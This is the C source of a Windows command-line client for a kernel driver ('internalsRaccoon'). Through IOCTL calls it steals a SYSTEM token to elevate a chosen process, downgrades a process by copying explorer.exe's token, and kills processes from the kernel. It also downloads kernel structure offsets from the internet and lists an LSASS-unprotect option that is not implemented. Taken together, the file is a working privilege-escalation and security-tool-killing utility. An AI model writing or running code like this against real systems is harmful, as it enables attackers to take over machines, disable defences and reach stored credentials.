#include "defs.h"
#include "ntoskrnl_dynamic_offset_res.h"
#include <tlhelp32.h>

HANDLE hDevice;


DWORD find_pid_by_name(const wchar_t* proc_name) {
    if (!proc_name) return 0;

    HANDLE snapshot;
    PROCESSENTRY32W pe32;
    DWORD pid = 0;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(proc_name, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}



BOOL modToken(DWORD32 target , DWORD32 toStealFrom){

    REPLACE_TOKEN_INFO tosend = { 0 };

    tosend.target = target;
    tosend.stealFrom = toStealFrom;

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_REPLACE_TOKEN,
        &tosend,
        sizeof(REPLACE_TOKEN_INFO),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {

        printf("[ERROR] Failed to modify token of process");
        return -1;
    }
}


BOOL kill(DWORD32 target) {
    REPLACE_TOKEN_INFO tosend = { 0 };

    tosend.target = target;

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &tosend,
        sizeof(REPLACE_TOKEN_INFO),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {

        printf("[ERROR] Failed to kill process");
        return -1;
    }
}


void help() {
    printf("Usage: Program.exe [options]\n\n");
    printf("Options:\n");
    printf("  -e <pid>    Elevate privileges of the specified PID. If PID is 0 , elevates current process.\n");
    printf("  -d <pid>    Downgrade privileges of the specified PID to match a low-integrity process (explorer.exe).\n");
    printf("  -k <pid>    Kill the process with the given PID.\n");
    printf("  -l          Unprotect LSASS (enables interaction or manipulation with LSASS).\n");
    printf("\nExamples:\n");
    printf("  Program.exe -e 1234           Elevate process 1234\n");
    printf("  Program.exe -d 5678           Downgrade process 5678\n");
    printf("  Program.exe -k 4321           Kill process 4321\n");
    printf("  Program.exe -l                Unprotect LSASS\n");
}



void resolve_kstruct_offsets() {


    LoadNtoskrnlOffsetsFromInternet(TRUE);

    printf("[!] EPROCESS's Protection flag at offset %lu\n", g_ntoskrnlOffsets.st.eprocess_protection);

}




int main(int argc, char** argv)
{
    if (argc == 1) {
        help();
        return -1;
    }
    if (argc == 2 && (strcmp(argv[1], "-h") == 0)) {

        help();
        return -1;
    }


    char* elevate = NULL;
    char* downgrade = NULL;
    char* tokill = NULL;
    int lsass_unprotect = 0;

    for (int i = 1; i < argc; i++) {

        if (strcmp(argv[i], "-h") == 0) {
            continue;
        }
        else if (strcmp(argv[i], "-e") == 0) {
            if (i + 1 < argc) {
                elevate = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -e requires an argument\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-d") == 0) {
            if (i + 1 < argc) {
                downgrade = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -d requires an argument\n");
                return 1;
            }
        }

        else if (strcmp(argv[i], "-k") == 0) {
            if (i + 1 < argc) {
                tokill = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -k requires an argument\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-l") == 0) {
            lsass_unprotect = 1;
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            return 1;
        }
    }



    hDevice = CreateFile(L"\\\\.\\internalsRaccoon", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device. Error: %d\n", GetLastError());
        return 1;
    }



    if (elevate) {
        DWORD32 targetPid = (DWORD32)atoi(elevate);
        if (targetPid == 0) {
            targetPid = (DWORD32)GetCurrentProcessId();
        }
        printf("Elevating %lu\n", targetPid);
        modToken(targetPid, NULL);
    }


    if (downgrade) {
        DWORD32 targetPid = (DWORD32)atoi(downgrade);
        DWORD32 lowPid = (DWORD32)find_pid_by_name(L"explorer.exe");
        if (lowPid != 0) {
            printf("Downgrading %lu\n", targetPid);
            modToken(targetPid, lowPid);
        }
        else {
            printf("[-] Failed to find low integrity process for downgrade\n");
        }        
    }

    if (tokill) {
        DWORD32 targetPid = (DWORD32)atoi(tokill);
        printf("Killing %lu\n", targetPid);
        kill(targetPid);
    }

    if (lsass_unprotect) {
        printf("Unprotecting LSASS... (Unimplemented)\n");
    }






    return 0;

}

